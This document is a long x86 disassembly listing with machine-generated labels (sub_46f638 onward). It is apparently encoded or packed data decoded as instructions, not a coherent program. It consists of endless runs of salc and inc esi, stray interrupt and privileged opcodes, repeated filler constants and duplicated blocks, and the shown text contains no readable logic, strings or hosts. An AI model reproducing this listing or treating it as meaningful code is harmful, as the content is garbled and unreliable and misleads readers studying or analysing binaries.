jne r-xdata
inc esi
salc
salc
retn
add ecx [ esi + 0x20 ]
iretd
test esi edx
salc
salc
salc
mov ecx 0x3cf0610
mov dl 0xaf
mov esp 0xb946465d
adc [ edx ] edx
retn
sub_46f638
xchg [ ecx - 0x3e ] cl
pushad
jpo r-xdata
inc esi
inc esi
salc
scasb [ edi ]
fwait
insb
inc esi
inc esi
retn
inc esi
scasd [ edi ]
mov esp [ ebx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
push 0x46
inc esi

sbb [ edi + 0x74c24985 ] ecx
push esp
inc esi
inc esi
dec ecx
int1
pop ecx
scasd [ edi ]
adc [ eax ] al
inc esi
inc esi
salc
sub al 0x56

sub_46f662
add esp [ edx + 0x7cffaf15 ]
inc esi
inc esi
jne r-xdata
add ecx [ esi + 0x20 ]
iretd
test esi edx
salc
salc
salc
mov ecx 0x3cf0610
mov dl 0xaf
mov esp 0xb946465d
adc [ edx ] edx
retn
sub_46f761
cmp eax 0xaf11657b
push es
pop eax
inc esi
inc esi
push ss
scasd [ edi ]
sub esp [ esi + eax * 2 + 0x46 ]
salc
salc
and bh cl
add edi [ edx - 0x34a9ec35 ]
retn
sub_46f78d
adc esi [ edx + 0x4640dfae ]
inc esi
mov ecx 0xc3cb4e33
scasb [ edi ]
mov edx 0x33b9b9b9
push edx
push ss
mov ecx 0x4646aad1
inc esi
lds eax [ edx - 0x553c34b6 ]
mov ebx 0xb916b9b9
adc [ edx - 0x51 ] ebp
adc eax 0xd646464e
salc
salc
lds eax [ edx - 0x39b9d1b6 ]
inc esi
inc esi
adc eax 0x5e6232b9
mov ecx 0x57af3210
jpo r-xdata
iretd
inc esi
salc
salc
salc
salc
salc
salc
int 0x90
xchg ebp eax
mov esp 0xc5b203b9
xchg [ esi - 0x32 ] ecx
adc bl [ ebx - 0x7e ]
lds edi [ edi - 0x1b3bb69a ]
pop edi
inc esi
inc esi
add ebp eax
mov ecx 0xa7c44945
test eax 0x3ceb9b9
xchg esi eax
scasd [ edi ]
push ss
push eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x22
and bh cl
adc edi edx
sbb al 0x2c
and al 0x20
sub_46fe38
push esp
inc esi
inc esi
salc
salc
salc
push es
scasd [ edi ]
fidivr [ esi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds edi [ eax + 0x6cc44966 ]
mov ch 0xb9
mov ecx 0xc5ba03b9
cmp edi [ edx - 0x183bb6bb ]
inc esp
inc esi
inc esi
into
add esi edx
into
add esp [ edx - 0x317dfc32 ]
add edx [ edx - 0x5051f435 ]
iretd
sub_46fe74
imul eax [ esi + 0x46 ] 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0x8aaf462c
insd
inc esi
inc esi
salc
salc
adc ecx ebp
stosb [ edi ]
pop ss
pop ss
int 0x3
dec esi
scasd [ edi ]
mov al 0x7b
inc esi
inc esi
adc ecx ebp
stosb [ edi ]
pop ss
lds esp [ ebx ]
mov edx 0x1f762c46
and cl ch
inc edi
int 0x6
dec esi
iretd
sub_46fec9
add esp [ eax + 0x4e4faf1e ]
inc esi
inc esi
adc [ ecx ] dl
scasd [ edi ]
0xd646466f 0xd6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp esi [ esi - 0x30df6933 ]
adc edi [ edx - 0x51 ]
insd
test eax 0x11d6b9b9
iretd
sub_46fefe
add [ edx + 0x2e ] dh
in al 0xe0
daa
lodsd [ esi ]
adc [ esi + 0x464642c6 ] ebp
xchg ebx eax
or [ edx ] esp
adc edi ecx
add [ esi - 0x52 ] bh
xor al 0x42
inc esi
inc esi
aas
push 0xcf11d285
add [ edx - 0x52 ] bh
and al [ edx + 0x46 ]
inc esi
test [ cs : esi + 0x42 ] 0xaa0eafb1
mov ecx 0xd6d6d6b9
salc

sub_46ff83
inc esi
inc esi
adc eax 0x5f43af10
inc esi
inc esi
salc
salc
salc
push es
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46ffa3
sbb esp [ esi - 0x504de431 ]
xor esp [ ecx - 0x29294647 ]
pop [ ebp + 0x467eb1af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add ebx [ esi - 0x50d4d3e2 ]
mov cl 0x76
inc esi
inc esi
salc
salc
salc
salc

sub_47000e
scasb [ edi ]
mov edx 0xae16b9b9
pop esp
pop eax
inc esi
inc esi
scasd [ edi ]
mov bl 0xb7
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
int 0x3
mov edx 0x465ca1af
inc esi
salc
salc
push ds
sub al 0x63
and bh cl
add esi [ esi + ebx + 0x466eb0af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds esp [ edx ]
bound ebp [ edx + 0x46 ]
adc [ eax + 0x47526202 ] al
scasb [ edi ]
jecxz r-xdata
lds ecx [ esi - 0x29297a47 ]

inc esi
inc esi
pop ds
adc bh cl
add ah [ edx + 0x72 ]
scasb [ edi ]
push eax
dec ecx
inc esi
inc esi
lds esp [ edx ]
bound esp [ edx + 0x46 ]
pop ds
scasd [ edi ]
loope r-xdata
push eax
inc ecx
inc esi
inc esi
add [ ebp - 0x4a ] bh
dec ecx
les esp [ ebx - 0x47 ]
mov ecx 0xb9a157af
mov ecx 0xd6d6d6d6
iretd
inc esi
inc esi
salc
salc
salc
salc
inc ebp
mov dh 0x49
int1
add [ edx - 0x3b ] dl
or [ edx - 0x51 ] 0x3e
dec esp
inc esi
inc esi
salc
salc
and bh cl
adc ebx [ esi + 0x46645daf ]
inc esi
salc
out dx al
inc edi
scasd [ edi ]
xor al 0x47
inc esi
inc esi
salc
salc
dec ecx
iretd
sub_4700b6
add ebx [ ebp + ecx * 8 + 0x3cf2087 ]
0x19682c1e 0x232c
and bh cl
add ebx [ eax + 0x464fc5af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_47010f
or ah [ edx + 0xe ]
scasd [ edi ]
pop eax
test al 0xb9
mov ecx 0x48e5af16
inc esi
inc esi
scasb [ edi ]
sub [ ebx - 0x7d3a4647 ] edi
pop esi
scasd [ edi ]
out dx al
mov eax 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
or ebp [ edx + 0x5fafaf1f ]
inc esi
inc esi
salc
int 0xa
bound edx [ esi - 0x33 ]
xchg ecx eax
scasb [ edi ]
and edi [ eax - 0x793c4647 ]
dec ecx
retn 0x7a59
sub_470161
mov ecx 0x198675b9
sbb [ 0xffffffffd6d6d685 ] bl
salc
salc
salc
salc
salc
salc
salc
int 0x4e
scasd [ edi ]
imul esi [ esi - 0xeb64647 ] 0x41
push ss
and ch cl
add [ eax + 0x45 ] eax
add ah [ edx + 0x5a ]
dec ecx
int1
xchg [ esi ] dl
int 0x80
scasb [ edi ]
sub eax 0xc546464e
or [ edx - 0x31 ] 0x2
bound ebx [ esi - 0x3d ]
xchg [ ecx - 0x3e ] cl
sar [ esi + eax * 2 + 0x46 ] 0xc5
cmp ah [ edx + 0x62 ]
inc esi
dec ecx
retn 0x7c3d
sub_4701cb
mov ch 0xb9
mov ecx 0x59afc349
inc esi
inc esi
inc edx
inc edi
inc esi
inc esi
scasd [ edi ]
out dx eax
pop ecx
inc esi
inc esi
salc
salc
salc
salc
salc
adc eax 0x6a34af15
inc esi
inc esi
salc
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx - 0x798aeae2 ]
scasd [ edi ]
push esi
pop esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0xa1d4
sub_47020a
mov ecx 0xaf8675b9
jo r-xdata
popad
pop es
sbb eax 0xdac0cf11
inc esi
inc esi
inc esi
scasd [ edi ]
mov eax [ 0xffffffffd6d6b9b9 ]
dec ecx
int1
push edi
and bh cl
push edx
dec eax
scasd [ edi ]
sqrtps xmm0 [ esi + 0x46 ]
salc
salc
and bh cl
add ecx [ eax - 0x69fc30e0 ]
scasd [ edi ]
xor al 0xbe
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
and [ edi - 0x29294647 ] esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
and eax 0xd646465c
salc
salc
salc
salc
salc
adc [ edi + 0x464652ca ] ebp
salc
dec ecx
retn 0xbf3a
inc esi
lds edi [ edi + ecx * 2 + 0x466ea5af ]
inc esi
salc
salc
dec ecx
retn 0x6edf
sub_4702c8
sub [ edi + 0x7cdb9b9 ] bh
jpe r-xdata
salc
sbb eax [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
xchg [ ecx - 0x3e ] ecx
and eax 0xafb9b9bf
adc edi [ ecx - 0x29294647 ]
salc
salc
salc
salc
salc
lds eax [ edx - 0x112e46b6 ]
inc esi
inc esi
inc esi
scasd [ edi ]
movsd [ edi ] [ esi ]
dec eax
inc esi
inc esi
salc
dec ecx
retn
mov ecx 0xb9b913af
mov ecx 0xd6d6d6d6
adc [ ecx - 0x793cf5ef ] bh
scasd [ edi ]
mov ah 0x4a
inc esi
inc esi
int 0xc0
cli
inc esi
inc esi
inc esi
scasd [ edi ]
mov bh 0xab
mov ecx 0xd6d6d6b9
scasb [ edi ]
pop eax
outsb
inc esi
inc esi
pop ds

sub_470303
or edx [ edi + ebx - 0x30dfcdd4 ]
or edx [ edx - 0x50c1d3e1 ]
loop r-xdata
test al 0x1e
scasd [ edi ]
fdiv [ ebp + 0x46 ]
inc esi
salc
scasb [ edi ]
inc ebp
pop eax
inc esi
inc esi
retn
inc esi
inc esi
salc
salc
sbb eax [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
mov ecx 0xb9b913af
mov ecx 0xd6d6d6d6
salc
salc
salc
lds eax [ edx - 0x112e46b6 ]
inc esi
inc esi
inc esi
scasd [ edi ]
movsd [ edi ] [ esi ]
dec eax
inc esi
inc esi
salc
dec ecx
retn
adc [ ecx - 0x793cf5ef ] bh
scasd [ edi ]
mov ah 0x4a
inc esi
inc esi
int 0xc0
cli
inc esi
inc esi
inc esi
scasd [ edi ]
mov bh 0xab
mov ecx 0xd6d6d6b9
scasb [ edi ]
pop eax
outsb
inc esi
inc esi
pop ds

sub_47034b
add ah [ edx + 0xa ]
scasd [ edi ]
add edx [ edi + 0x46 ]
inc esi
salc
sub al 0x2f
and bh cl
add ebp [ eax + 0x75dcaf1e ]
inc esi
inc esi
salc
scasb [ edi ]
inc ebp
pop eax
inc esi
inc esi
retn
sub_4703c0
add [ esi - 0x51 ] dh
aad 0xb5
mov ecx 0x8506d6b9
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x74eeaf66 ]
inc esi
inc esi
int 0x3
mov esi 0xcdae03cf
add esi [ edx + 0x75aa03cf ]
xchg [ ebp - 0x6c ] dh
iretd
sub_4703f6
add edi [ edx + 0x4669b8af ]
inc esi
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx - 0x4cc050aa ]
mov ecx 0x3cf20b9
push esi
jne r-xdata
salc
salc
salc
salc
salc
jne r-xdata
sub al 0x68
scasd [ edi ]
int3
salc
salc
jne r-xdata
sbb [ 0xffffffffb9bea2af ] bl
mov ecx 0x3cfd6d6
xchg esi eax

mov ecx 0xb9b913af
mov ecx 0xd6d6d6d6
salc
salc
salc
lds eax [ edx - 0x112e46b6 ]
inc esi
inc esi
inc esi
scasd [ edi ]
movsd [ edi ] [ esi ]
dec eax
inc esi
inc esi
salc
dec ecx
retn
adc [ ecx - 0x793cf5ef ] bh
scasd [ edi ]
mov ah 0x4a
inc esi
inc esi
int 0xc0
cli
inc esi
inc esi
inc esi
scasd [ edi ]
mov bh 0xab
mov ecx 0xd6d6d6b9
scasb [ edi ]
pop eax
outsb
inc esi
inc esi
pop ds

sub_47041a
add esp [ edx - 0x46460051 ]
mov ecx 0x798abe2e
ud1 esi ecx
add [ esi + 0x46 ] 0x46
scasb [ edi ]
ror [ ebx + 0x46 ] cl
inc esi
scasd [ edi ]
lds esp [ eax + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
push es
scasd [ edi ]
sbb al 0xb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646ded1
inc esi
scasd [ edi ]
jge r-xdata
inc edx
inc esi
inc esi
and bh cl
or edx [ eax + 0x20272c1f ]
iretd
inc esi
inc esi
adc [ ecx - 0x50b19dce ] edi
inc ebx
push ebp
inc esi
inc esi
salc
salc
salc
scasd [ edi ]
inc ecx
test al 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
in eax dx
pop ebx
inc esi
inc esi
scasd [ edi ]
add eax 0xd646466c
iretd
sub_4704c1
or ebx [ esi + 0x466063af ]
inc esi
salc
salc
salc
into
add esp [ esi - 0x3169fc32 ]
add eax [ esi - 0x505df435 ]
mov bl 0xa1
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
push ss

sub_4704e6
mov esi 0xb916b9b9
adc [ esi - 0x51 ] ch
push es
stosd [ edi ]
mov ecx 0xa00cfb9
scasb [ edi ]
salc
mov eax 0x9ecdb9b9
and al al
mov ch 0x33
scasd [ edi ]
stosd [ edi ]
mov edi 0x91afb9b9
mov ecx 0xd6d6b9b9
salc
salc
inc ebp
add edx [ esi - 0x31 ]
add edi [ esi + 0x7dba03cd ]
add edi [ esi + 0x409ac249 ]
inc esi
inc esi
int 0x3
mov edx 0x465f72af
inc esi
int 0x80
scasd [ edi ]
jb r-xdata
sub eax 0xd6464647
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ds
sub al 0x20
and bh cl
add esi [ esi + 0x202f2c1e ]
iretd
inc esi
inc esi
salc
salc
salc
salc
jne r-xdata
sub al 0x27
and bh cl
push es
pop [ ebp - 0x4dfc30e0 ]
scasd [ edi ]
mov al 0xb9
mov ecx 0x5025afd6
inc esi
inc esi
salc
salc
salc
salc
salc
push ss
scasd [ edi ]
inc esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x20
iretd
sub_4705aa
cmp ebp [ ecx + ebx + 0x466cb3af ]
inc esi
salc
sub al 0x2b
scasd [ edi ]
lodsb [ esi ]
push ebp
inc esi
inc esi
sub al 0x2f
sbb eax 0xb21bcf20
int 0x99
and bh cl
sbb esi [ eax - 0x13506133 ]
inc ecx
inc esi
inc esi
push ds
scasd [ edi ]
cmp esp [ ebx + 0x46 ]
inc esi
salc
lds eax [ edx + 0x4986c34a ]
retn 0xaf24
sub_47068d
inc esi
inc esi
and eax 0x15d74da1
scasb [ edi ]
mov bh 0xba
mov ecx 0xb3ed2eb9
cmp edi [ edx + 0x15 ]
scasd [ edi ]
push 0x46
inc esi
salc
salc
salc
salc
salc
lds eax [ edx - 0x53d984b6 ]
inc esi
inc esi
dec ecx
ror [ esi + 0x46 ] 0x46
inc esi
mov esi 0xb946466c
adc [ esi + 0x7f ] cl
sbb ah [ edx + 0x52 ]
scasd [ edi ]
pushad
pop esp
inc esi
inc esi
salc
salc
salc
int 0x3
dec esi
sub al 0x46
scasd [ edi ]
fwait
inc edi
inc esi
inc esi
salc
salc
salc
salc
sub al 0x74
and bh cl
add ebp [ esi - 0x465d6051 ]
mov ecx 0x7c13cf20
int 0xbe
scasd [ edi ]
mov dl 0xb1
mov ecx 0x8675d6b9
sbb [ eax ] ebx
sbb eax 0xf8c7858f
cli
inc esi
inc esi
inc esi
mov dl 0x47
inc esi
inc esi
dec ecx
0x464e
sub_470712
mov esi 0xaeb9b9bb
and dh [ eax + 0x46 ]
inc esi
lds edi [ esi - 0x213bb6fa ]
mov ah 0xb9
mov ecx 0xcdaf462c
mov ah 0xb9
mov ecx 0xd6d6d6d6
salc
scasb [ edi ]
mov ah 0xa8
mov ecx 0xbdb1afb9
mov ecx 0x26b82eb9
and eax 0xcf11ab
push edx
scasb [ edi ]
add eax 0x2eb9b9ba
retn 0x583d
sub_47078b
inc esi
inc esi
adc eax 0xbb8ec3cb
mov ecx 0xbb28afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x20
iretd
sub_4707aa
adc esi [ edi + ebp * 4 - 0x1e ]
jae r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
scasb [ edi ]
shl [ eax - 0x7d3a4647 ] 0x4a
scasd [ edi ]
inc esp
jne r-xdata
inc esi
salc
push ds
and bh cl
add edi [ edx - 0x30df798b ]
add edi [ eax + 0x4647422e ]
inc esi

mov ecx 0xb8cd7635
mov ecx 0x49626232
retn
inc esi
salc
salc
salc

sub_4707ee
scasd [ edi ]
cmp [ ecx + edi * 4 - 0x29292947 ] 0xffffffd6
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
scasb [ edi ]
shl [ eax - 0x7d3a4647 ] 0x4a
scasd [ edi ]
inc esp
jne r-xdata
mov ecx 0xb8cd7635
mov ecx 0x49626232
retn
inc esi
salc
salc
salc

sub_470817
push cs
inc esp
sub eax 0x8f2d4386
inc ebx
cld
mov ecx 0xaf464653
mov dh 0x42
inc esi
inc esi
salc
salc
salc
salc
salc
lds esp [ ebx ]
mov edx 0x4fa3af46
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4643
sub_470863
cld
je r-xdata
scasd [ edi ]
and [ edx - 0x29294647 ] bl
pop ecx
inc esi
inc esi
scasb [ edi ]
xchg [ ecx + 0x46 ] esp
inc esi
scasd [ edi ]
je r-xdata
mov edx 0xd6d6b9b9
salc
salc
salc
dec ecx
retn 0x49fd
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
pop ss
pop ss
adc [ edi + 0x46467651 ] ebp
salc
salc
salc
salc
salc
salc

dec ecx
inc esi
scasd [ edi ]
test [ ebx + 0x11b9b9b9 ] ah
push edx
scasd [ edi ]
xor al 0x64
inc esi
inc esi
salc
salc
salc
salc
salc
scasd [ edi ]
je r-xdata
inc esi
salc
salc
salc
salc
salc
dec ecx
retn
sub_470884
aam 0x4c
inc esi
inc esi
scasd [ edi ]
push cs
dec ebp
inc esi
inc esi
salc
lds eax [ edx + 0x444e2e4a ]
inc esi
inc esi
scasd [ edi ]
imul ebp [ ebp + 0x46 ] 0xbcdd646
dec esi
int 0x3
mov edx 0x45c052cd
xchg edi eax
scasb [ edi ]
arpl [ eax + 0x20afb9b9 ] si
0xd6d6b9b9 0x592e
inc esi
dec ecx
inc esi
scasd [ edi ]
test [ ebx + 0x11b9b9b9 ] ah
push edx
scasd [ edi ]
xor al 0x64
inc esi
inc esi
salc
salc
salc
salc
salc
scasd [ edi ]
je r-xdata
mov edx 0xd6d6b9b9
salc
salc
salc
dec ecx
retn 0x49fd
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
pop ss
pop ss
adc [ edi + 0x46467651 ] ebp
salc
salc
salc
salc
salc
salc

sub_4708e5
add eax [ esi + 0x1ac3cb16 ]
mov ebx 0xb916b9b9
xor ecx [ esi - 0x51 ]
cmpsb [ esi ] [ edi ]
imul eax [ esi + 0x46 ] 0xd6d6d6d6
salc
salc
salc
salc
pop ss
pop ss
adc eax 0x7d109d75
mov ebp 0xa040c249
mov ecx 0x4e1b7fb9
dec ecx
retn 0xa3bb
sub_470914
mov ecx 0x40acafb9
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
cmp [ edx - 0x29294647 ] 0xd6
salc
salc
dec ecx
retn 0x49fd
sub_470938
inc esi
inc esi
scasd [ edi ]
je r-xdata
salc
int 0x8e
and bh cl
or edi [ edx - 0x30df708b ]
or edi [ eax + 0x20222c1f ]
inc esi
inc esi
salc
scasd [ edi ]
mov al 0x98
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
inc ebp
test [ ecx + 0x464742f6 ] edi
inc esi
int 0xce
inc esi
inc edi
inc esi
inc esi
mov ecx 0xaf526232
popad
jb r-xdata
iretd
and ah [ eax ]
inc esi
adc ebp ecx
mov esi 0xb9a564af
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx - 0x50793cb6 ]
arpl [ ebp - 0x29294647 ] bx
salc
salc
salc
salc
mov ecx 0x4646f6d0
inc esi
adc eax 0x9b42af11
mov ecx 0xd6d6d6b9
salc
sub_4709ad
or edx [ esi + 0x466a05af ]
inc esi
salc
salc
dec ecx
enter 0xbc4b 0xb9
mov ecx 0x43af8675
mov esp 0xaacdb9b9
pop ss
adc ebp ecx
mov esi 0x46eed1b9
inc esi
inc esi
scasd [ edi ]
adc [ ebx + 0x46 ] esp
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_470a34
inc esi
inc esi
jne r-xdata
fwait
adc eax 0xead0b901
inc esi
inc esi
inc esi
int 0x81
sbb [ eax ] ebx
sbb eax 0x8f3283c5
test esi edx
salc
salc
salc
salc
salc
int 0x81
and bh cl
add esp [ esi - 0x4642ca51 ]
mov ecx 0x4641962e
inc esi
mov ecx 0x38af4e10
pop edi
inc esi
inc esi
salc
inc esi
inc esi
salc
salc
salc
salc
salc
lds eax [ edi - 0x50798abc ]
jb r-xdata
mov ecx 0x86c31fb9
scasd [ edi ]
or [ ebp + 0x46 ] ah
inc esi
salc
scasd [ edi ]
ja r-xdata
push es
scasd [ edi ]
inc eax
inc ecx
inc esi
inc esi
salc
scasd [ edi ]
popad
mov bh 0xb9
mov ecx 0xb46dd6d6
dec ecx
int1
dec esp
scasd [ edi ]
adc [ eax + 0x46 ] 0x15111146
iretd
salc
jne r-xdata
inc esi
inc esi
pop [ ebp - 0x2929292a ]
salc
dec ecx
sub_470a92
add edi [ edx + 0x465355af ]
inc esi
salc
salc
salc
salc
salc
sub al 0x68
sbb [ ebx ] ch
and bh cl
add esp [ esi - 0x33 ]
and [ eax ] 0xcf
add esp [ esi + ebx + 0x2c ]
int 0x8e
and bh cl
or esp [ edx + 0x1f ]
sub al 0x34
int 0x9f
and bh cl
sbb esp [ eax - 0x33 ]
sahf
and bh cl
sbb ebp [ esi + 0x75 ]
popfd
and bh cl
sbb ebp [ ebp + ecx * 8 - 0x67 ]
and bh cl
sbb edi [ esi + 0x1bcf201d ]
mov esp 0x9ccd252c
and bh cl
sbb edi [ edx + 0x1bcf201d ]
mov eax 0xb9b48aaf
mov ecx 0xaed6d6d6
fnstsw [ esi + 0x6bafb9b9 ]
mov ch 0xb9
mov ecx 0xd6d6d6d6

sub_470b7d
inc eax
scasb [ edi ]
dec esi
mov esi 0x2d2eb9b9
adc dh dh
jbe r-xdata
inc esi
inc esi
scasb [ edi ]
mov al [ 0xffffffffc5b9b9b1 ]
and [ esi - 0x31 ] 0xc0
mov dh 0x46
inc esi
inc esi
scasd [ edi ]
fild [ esi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
int 0xaa
lds ebp [ edx + 0x7511154a ]
mov ecx 0x19af1111
push ebp
inc esi
inc esi
salc
salc
salc
salc
salc
add [ ebx ] 0x362925aa
aas
add [ ebx ] 0x246966b6
scasw [ edi ]
sub [ ecx + edi * 4 - 0x46292947 ] 0x11
pop edx
inc esi
mov [ esi + 0x46 ] 0x15
scasd [ edi ]
and [ ecx - 0x29294647 ] 0xd6
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
dec esi
pop [ ebp - 0x2929292a ]
mov ecx 0xc8af2210
mov bh 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
retn
iretd
sub_470b8a
shr [ edx - 0x51b9b9ba ] 0xb1
mov cl 0xb9
mov ecx 0x2c25602e
rcl [ 0x46aec0cf ] 0x1
inc esi
inc esi
scasb [ edi ]
mov al [ 0xffffffffc5b9b9b1 ]
and [ esi - 0x31 ] 0xc0
mov dh 0x46
inc esi
inc esi
scasd [ edi ]
fild [ esi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
int 0xaa
lds ebp [ edx + 0x7511154a ]
mov ecx 0x19af1111
push ebp
inc esi
inc esi
salc
salc
salc
salc
salc
add [ ebx ] 0x362925aa
aas
add [ ebx ] 0x246966b6
scasw [ edi ]
sub [ ecx + edi * 4 - 0x46292947 ] 0x11
pop edx
inc esi
mov [ esi + 0x46 ] 0x15
scasd [ edi ]
and [ ecx - 0x29294647 ] 0xd6
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
dec esi
pop [ ebp - 0x2929292a ]
mov ecx 0xc8af2210
mov bh 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
retn
sub_470c19
xchg [ ecx - 0x3d ] cl
push ss
movsb [ edi ] [ esi ]
mov ecx 0xd6858fb9
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
cmc
dec esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
int 0x80
scasd [ edi ]
retn 0x4640
sub_470c5b
push ss
inc esp
inc esi
inc esi
adc [ esi - 0x32d8d3e1 ] ebp
xchg [ edi - 0x46464af0 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_470c9d
idiv [ ebx - 0x66514647 ]
mov [ 0xffffffff9cafb9b9 ] eax
pop esp
inc esi
inc esi
jpo r-xdata
inc esi
inc esi
scasd [ edi ]
iretd
lodsb [ esi ]
inc esi
inc esi
dec ecx
rol [ eax + 0x46 ] 0x46
inc esi
mov ecx 0x10b90635
dec esi
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

add [ edi + 0x3d ] edi
outsb
dec ecx
retn
sub_470ce7
add edi [ esi + 0x2c582c16 ]
mov ecx 0xafbe3bcf
cdq
sahf
mov ecx 0xcf20d6b9
or esi [ eax - 0x5dfc34e1 ]
push ss
int 0x3
dec esi
and bh cl
or edi [ esi - 0x4663bd52 ]
mov ecx 0x865d9eb1
pop ds
mov cl 0x9e
pop [ ebp - 0x2929292a ]
and bh cl
push edx
ja r-xdata
xor dh [ esi + 0x4a ]
add [ edx ] 0x76
push esi
test [ edi + 0x464646bb ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x85
scasd [ edi ]
rol [ ebx + 0x46 ] cl
inc esi
salc
salc
salc
int 0xaa
scasd [ edi ]
pop ebp
mov ah 0xb9
mov ecx 0xaacdd6d6
sub_470d6a
adc cl [ edi + 0x46 ]
inc esi
adc eax 0xb6cd1110
scasd [ edi ]
fwait
dec ebx
inc esi
inc esi
and bh cl
sbb edi [ esi - 0x30df6733 ]
sbb edi [ ebp + ecx * 8 + 0x1bcf209e ]
mov edx 0xb9bd7baf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4e68
sub_470da5
inc esi
inc esi
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x85
scasd [ edi ]
rol [ ebx + 0x46 ] cl
inc esi
salc
salc
salc
int 0xaa
scasd [ edi ]
pop ebp
mov ah 0xb9
mov ecx 0xaacdd6d6
jg r-xdata
mov ecx 0x4752cbb9
lds esp [ ecx + ecx * 2 + 0x767c52cc ]
push esi
push es
or [ ecx - 0x3d ] cl
push esi
pop esi
inc esi
inc esi
sbb [ eax ] ebx
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646c6d0
inc esi
iretd
dec edx
dec ecx
shl [ edi + 0x4e ] 0x46
inc esi
adc [ edi - 0x46465bac ] ch

sub_470ea8
mov ecx 0xa092c249
mov ecx 0x6c45afb9
inc esi
inc esi
salc
salc
salc
salc
int 0x3
dec esi
sbb eax [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xe0af5633
pop ecx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ds
retn
sub_470ee2
xchg [ edi - 0x46466e80 ] ch
salc
salc
salc
scasb [ edi ]
xchg [ esi + 0x5eafb9b9 ] esi
popad
inc esi
inc esi
salc
salc
sub al 0x34
int 0x81
and bh cl
add edx [ edx + 0x1e ]
sub al 0x29
sbb al 0x2c
and eax 0x5003cf20
int 0x84
and bh cl
add ebx [ esi + 0x1e ]
scasd [ edi ]
mov dh 0x98
mov ecx 0x8116d6b9
add esp [ esi + 0x27302227 ]
scasd [ edi ]
adc dh [ ecx - 0x29294647 ]
salc
salc
salc
salc
salc
dec ecx
retn 0xbe88
sub_470fe8
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_470ff5
sbb ebx [ esi + 0x11b633b9 ]
